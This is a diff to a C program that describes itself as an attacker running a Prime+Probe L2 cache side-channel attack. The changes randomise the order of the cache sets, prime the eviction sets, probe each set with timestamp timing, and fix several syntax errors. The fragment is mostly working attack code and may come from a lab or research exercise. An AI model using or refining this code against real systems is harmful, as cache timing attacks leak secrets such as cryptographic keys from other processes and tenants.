@@ -29,6 +29,15 @@ static inline void wait_cycles(uint64_t cycles) {
     while (rdtsc() - start < cycles);
 }
 
+void shuffle(int *arr) {
+    for(int i = NUM_L2_CACHE_SETS - 1; i > 0; i--) {
+        int j = rand() % (i + 1);
+        int tmp = arr[i];
+        arr[i] = arr[j];
+        arr[j] = tmp;
+    }
+}
+
 int main() {
 
     printf("Attacker ready. Prime+Probe starting...\n");
@@ -59,20 +68,31 @@ int main() {
 
         uint64_t scores[NUM_L2_CACHE_SETS] = {0};
 
+        
+
         for(int r = 0; r < REPEATS; r++) {
-            int perm[NUM_L2_CATCHE_SETS]
+            int perm[NUM_L2_CACHE_SETS];
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+                perm[i] = i;
+            }
             shuffle(perm);
+            
             /* PRIME */
-            for(int i = 0; set < NUM_L2_CACHE_SETS; i++) {
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+
                 int set = perm[i];
+
+                for(int w = 0; w < WAYS; w++) {
+                    tmp ^= *eviction_sets[set][w];
+                }
             }
 
             wait_cycles(2000);
 
             /* PROBE */
-            for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
 
-                uint64_t start = rdtsc();
+                int set = perm[i];
 
                 for(int w = WAYS-1; w >= 0; w--) {
 
@@ -82,6 +102,7 @@ int main() {
 
                     scores[set] += (end - start);
                 }
+            }
         }
 
         /* Combine alias groups */
